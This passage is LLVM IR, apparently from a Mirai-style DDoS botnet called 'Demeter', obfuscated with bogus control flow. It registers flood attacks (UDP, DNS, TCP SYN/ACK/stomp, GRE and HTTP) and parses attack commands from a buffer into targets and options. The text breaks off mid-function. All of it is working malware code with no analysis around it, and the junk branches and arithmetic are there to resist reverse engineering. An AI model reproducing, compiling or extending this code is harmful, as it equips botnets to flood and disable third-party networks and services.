; ModuleID = 'host/ir_bcf/Demeter.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [8 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [63 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 1043935, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  call void @add_attack(i8 zeroext 0, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 8, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 9, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* bitcast (void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http to void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*))
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = load i32, i32* @x.3
  %4 = load i32, i32* @y.4
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %13 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %11, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %14 = call noalias i8* @calloc(i64 1, i64 16) #6
  %15 = bitcast i8* %14 to %struct.attack_method*
  store %struct.attack_method* %15, %struct.attack_method** %13, align 8
  %16 = load i8, i8* %11, align 1
  %17 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %18 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %17, i32 0, i32 1
  store i8 %16, i8* %18, align 8
  %19 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %12, align 8
  %20 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %21 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %20, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %19, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %21, align 8
  %22 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %23 = bitcast %struct.attack_method** %22 to i8*
  %24 = load i8, i8* @methods_len, align 1
  %25 = zext i8 %24 to i32
  %26 = add nsw i32 %25, 1
  %27 = sext i32 %26 to i64
  %28 = mul i64 %27, 8
  %29 = call i8* @realloc(i8* %23, i64 %28) #6
  %30 = bitcast i8* %29 to %struct.attack_method**
  store %struct.attack_method** %30, %struct.attack_method*** @methods, align 8
  %31 = load %struct.attack_method*, %struct.attack_method** %13, align 8
  %32 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %33 = load i8, i8* @methods_len, align 1
  %34 = add i8 %33, 1
  store i8 %34, i8* @methods_len, align 1
  %35 = zext i8 %33 to i64
  %36 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %32, i64 %35
  store %struct.attack_method* %31, %struct.attack_method** %36, align 8
  %37 = load i32, i32* @x.3
  %38 = load i32, i32* @y.4
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %45 = alloca i8, align 1
  %46 = alloca void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %47 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %45, align 1
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %48 = call noalias i8* @calloc(i64 1, i64 16) #6
  %49 = bitcast i8* %48 to %struct.attack_method*
  store %struct.attack_method* %49, %struct.attack_method** %47, align 8
  %50 = load i8, i8* %45, align 1
  %51 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %52 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %51, i32 0, i32 1
  store i8 %50, i8* %52, align 8
  %53 = load void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %46, align 8
  %54 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %55 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %54, i32 0, i32 0
  store void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)* %53, void (i32, i8, %struct.attack_target*, i8, %struct.attack_option*)** %55, align 8
  %56 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %57 = bitcast %struct.attack_method** %56 to i8*
  %58 = load i8, i8* @methods_len, align 1
  %59 = zext i8 %58 to i32
  %_ = shl i32 %59, 1
  %_1 = sub i32 0, %59
  %gen = add i32 %_1, 1
  %_2 = shl i32 %59, 1
  %_3 = shl i32 %59, 1
  %_4 = shl i32 %59, 1
  %_5 = sub i32 0, %59
  %gen6 = add i32 %_5, 1
  %60 = add nsw i32 %59, 1
  %61 = sext i32 %60 to i64
  %_7 = shl i64 %61, 8
  %_8 = sub i64 0, %61
  %gen9 = add i64 %_8, 8
  %_10 = shl i64 %61, 8
  %_11 = sub i64 0, %61
  %gen12 = add i64 %_11, 8
  %_13 = sub i64 0, %61
  %gen14 = add i64 %_13, 8
  %_15 = sub i64 0, %61
  %gen16 = add i64 %_15, 8
  %_17 = sub i64 0, %61
  %gen18 = add i64 %_17, 8
  %62 = mul i64 %61, 8
  %63 = call i8* @realloc(i8* %57, i64 %62) #6
  %64 = bitcast i8* %63 to %struct.attack_method**
  store %struct.attack_method** %64, %struct.attack_method*** @methods, align 8
  %65 = load %struct.attack_method*, %struct.attack_method** %47, align 8
  %66 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %67 = load i8, i8* @methods_len, align 1
  %_19 = sub i8 0, %67
  %gen20 = add i8 %_19, 1
  %_21 = sub i8 0, %67
  %gen22 = add i8 %_21, 1
  %_23 = sub i8 0, %67
  %gen24 = add i8 %_23, 1
  %_25 = sub i8 %67, 1
  %gen26 = mul i8 %_25, 1
  %_27 = sub i8 0, %67
  %gen28 = add i8 %_27, 1
  %68 = add i8 %67, 1
  store i8 %68, i8* @methods_len, align 1
  %69 = zext i8 %67 to i64
  %70 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %66, i64 %69
  store %struct.attack_method* %65, %struct.attack_method** %70, align 8
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %347

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4
  %27 = trunc i64 %26 to i32
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %17
  br label %347

; <label>:31:                                     ; preds = %17
  %32 = load i8*, i8** %3, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %3, align 8
  %34 = load i8, i8* %32, align 1
  store i8 %34, i8* %7, align 1
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 1
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %31
  br label %347

; <label>:42:                                     ; preds = %31
  %43 = load i32, i32* @x.5
  %44 = load i32, i32* @y.6
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %42
  %51 = load i8*, i8** %3, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %3, align 8
  %53 = load i8, i8* %51, align 1
  store i8 %53, i8* %8, align 1
  %54 = load i32, i32* %4, align 4
  %55 = sext i32 %54 to i64
  %56 = sub i64 %55, 1
  %57 = trunc i64 %56 to i32
  store i32 %57, i32* %4, align 4
  %58 = load i8, i8* %8, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  %61 = load i32, i32* @x.5
  %62 = load i32, i32* @y.6
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %60, label %69, label %86

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* @x.5
  %71 = load i32, i32* @y.6
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i32, i32* @x.5
  %79 = load i32, i32* @y.6
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %347

; <label>:86:                                     ; preds = %originalBBpart2
  %87 = load i32, i32* %4, align 4
  %88 = sext i32 %87 to i64
  %89 = load i8, i8* %8, align 1
  %90 = zext i8 %89 to i64
  %91 = mul i64 5, %90
  %92 = icmp ult i64 %88, %91
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %86
  br label %347

; <label>:94:                                     ; preds = %86
  %95 = load i32, i32* @x.5
  %96 = load i32, i32* @y.6
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i8, i8* %8, align 1
  %104 = zext i8 %103 to i64
  %105 = call noalias i8* @calloc(i64 %104, i64 24) #6
  %106 = bitcast i8* %105 to %struct.attack_target*
  store %struct.attack_target* %106, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  %107 = load i32, i32* @x.5
  %108 = load i32, i32* @y.6
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %115

; <label>:115:                                    ; preds = %194, %originalBBpart28
  %116 = load i32, i32* @x.5
  %117 = load i32, i32* @y.6
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i32, i32* %5, align 4
  %125 = load i8, i8* %8, align 1
  %126 = zext i8 %125 to i32
  %127 = icmp slt i32 %124, %126
  %128 = load i32, i32* @x.5
  %129 = load i32, i32* @y.6
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %127, label %136, label %197

; <label>:136:                                    ; preds = %originalBBpart212
  %137 = load i32, i32* @x.5
  %138 = load i32, i32* @y.6
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %136
  %145 = load i8*, i8** %3, align 8
  %146 = bitcast i8* %145 to i32*
  %147 = load i32, i32* %146, align 4
  %148 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %149 = load i32, i32* %5, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 1
  store i32 %147, i32* %152, align 4
  %153 = load i8*, i8** %3, align 8
  %154 = getelementptr inbounds i8, i8* %153, i64 4
  store i8* %154, i8** %3, align 8
  %155 = load i8*, i8** %3, align 8
  %156 = getelementptr inbounds i8, i8* %155, i32 1
  store i8* %156, i8** %3, align 8
  %157 = load i8, i8* %155, align 1
  %158 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %159 = load i32, i32* %5, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 2
  store i8 %157, i8* %162, align 4
  %163 = load i32, i32* %4, align 4
  %164 = sext i32 %163 to i64
  %165 = sub i64 %164, 5
  %166 = trunc i64 %165 to i32
  store i32 %166, i32* %4, align 4
  %167 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %168 = load i32, i32* %5, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 0
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %171, i32 0, i32 0
  store i16 2, i16* %172, align 4
  %173 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %174 = load i32, i32* %5, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i64 %181
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i32 0, i32 0
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %183, i32 0, i32 2
  %185 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %184, i32 0, i32 0
  store i32 %178, i32* %185, align 4
  %186 = load i32, i32* @x.5
  %187 = load i32, i32* @y.6
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart219, label %originalBB14alteredBB

originalBBpart219:                                ; preds = %originalBB14
  br label %194

; <label>:194:                                    ; preds = %originalBBpart219
  %195 = load i32, i32* %5, align 4
  %196 = add nsw i32 %195, 1
  store i32 %196, i32* %5, align 4
  br label %115

; <label>:197:                                    ; preds = %originalBBpart212
  %198 = load i32, i32* %4, align 4
  %199 = sext i32 %198 to i64
  %200 = icmp ult i64 %199, 1
  br i1 %200, label %201, label %218

; <label>:201:                                    ; preds = %197
  %202 = load i32, i32* @x.5
  %203 = load i32, i32* @y.6
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %201
  %210 = load i32, i32* @x.5
  %211 = load i32, i32* @y.6
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %347

; <label>:218:                                    ; preds = %197
  %219 = load i8*, i8** %3, align 8
  %220 = getelementptr inbounds i8, i8* %219, i32 1
  store i8* %220, i8** %3, align 8
  %221 = load i8, i8* %219, align 1
  store i8 %221, i8* %9, align 1
  %222 = load i32, i32* %4, align 4
  %223 = sext i32 %222 to i64
  %224 = sub i64 %223, 1
  %225 = trunc i64 %224 to i32
  store i32 %225, i32* %4, align 4
  %226 = load i8, i8* %9, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp sgt i32 %227, 0
  br i1 %228, label %229, label %339

; <label>:229:                                    ; preds = %218
  %230 = load i32, i32* @x.5
  %231 = load i32, i32* @y.6
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %229
  %238 = load i8, i8* %9, align 1
  %239 = zext i8 %238 to i64
  %240 = call noalias i8* @calloc(i64 %239, i64 16) #6
  %241 = bitcast i8* %240 to %struct.attack_option*
  store %struct.attack_option* %241, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  %242 = load i32, i32* @x.5
  %243 = load i32, i32* @y.6
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %250

; <label>:250:                                    ; preds = %335, %originalBBpart227
  %251 = load i32, i32* %5, align 4
  %252 = load i8, i8* %9, align 1
  %253 = zext i8 %252 to i32
  %254 = icmp slt i32 %251, %253
  br i1 %254, label %255, label %338

; <label>:255:                                    ; preds = %250
  %256 = load i32, i32* %4, align 4
  %257 = sext i32 %256 to i64
  %258 = icmp ult i64 %257, 1
  br i1 %258, label %259, label %260

; <label>:259:                                    ; preds = %255
  br label %347

; <label>:260:                                    ; preds = %255
  %261 = load i8*, i8** %3, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %3, align 8
  %263 = load i8, i8* %261, align 1
  %264 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %265 = load i32, i32* %5, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %264, i64 %266
  %268 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %267, i32 0, i32 1
  store i8 %263, i8* %268, align 8
  %269 = load i32, i32* %4, align 4
  %270 = sext i32 %269 to i64
  %271 = sub i64 %270, 1
  %272 = trunc i64 %271 to i32
  store i32 %272, i32* %4, align 4
  %273 = load i32, i32* %4, align 4
  %274 = sext i32 %273 to i64
  %275 = icmp ult i64 %274, 1
  br i1 %275, label %276, label %277

; <label>:276:                                    ; preds = %260
  br label %347

; <label>:277:                                    ; preds = %260
  %278 = load i8*, i8** %3, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %3, align 8
  %280 = load i8, i8* %278, align 1
  store i8 %280, i8* %12, align 1
  %281 = load i32, i32* %4, align 4
  %282 = sext i32 %281 to i64
  %283 = sub i64 %282, 1
  %284 = trunc i64 %283 to i32
  store i32 %284, i32* %4, align 4
  %285 = load i32, i32* %4, align 4
  %286 = load i8, i8* %12, align 1
  %287 = zext i8 %286 to i32
  %288 = icmp slt i32 %285, %287
  br i1 %288, label %289, label %290

; <label>:289:                                    ; preds = %277
  br label %347

; <label>:290:                                    ; preds = %277
  %291 = load i32, i32* @x.5
  %292 = load i32, i32* @y.6
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %290
  %299 = load i8, i8* %12, align 1
  %300 = zext i8 %299 to i32
  %301 = add nsw i32 %300, 1
  %302 = sext i32 %301 to i64
  %303 = call noalias i8* @calloc(i64 %302, i64 1) #6
  %304 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %305 = load i32, i32* %5, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %304, i64 %306
  %308 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %307, i32 0, i32 0
  store i8* %303, i8** %308, align 8
  %309 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %310 = load i32, i32* %5, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %309, i64 %311
  %313 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %312, i32 0, i32 0
  %314 = load i8*, i8** %313, align 8
  %315 = load i8*, i8** %3, align 8
  %316 = load i8, i8* %12, align 1
  %317 = zext i8 %316 to i32
  call void @util_memcpy(i8* %314, i8* %315, i32 %317)
  %318 = load i8, i8* %12, align 1
  %319 = zext i8 %318 to i32
  %320 = load i8*, i8** %3, align 8
  %321 = sext i32 %319 to i64
  %322 = getelementptr inbounds i8, i8* %320, i64 %321
  store i8* %322, i8** %3, align 8
  %323 = load i8, i8* %12, align 1
  %324 = zext i8 %323 to i32
  %325 = load i32, i32* %4, align 4
  %326 = sub nsw i32 %325, %324
  store i32 %326, i32* %4, align 4
  %327 = load i32, i32* @x.5
  %328 = load i32, i32* @y.6
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
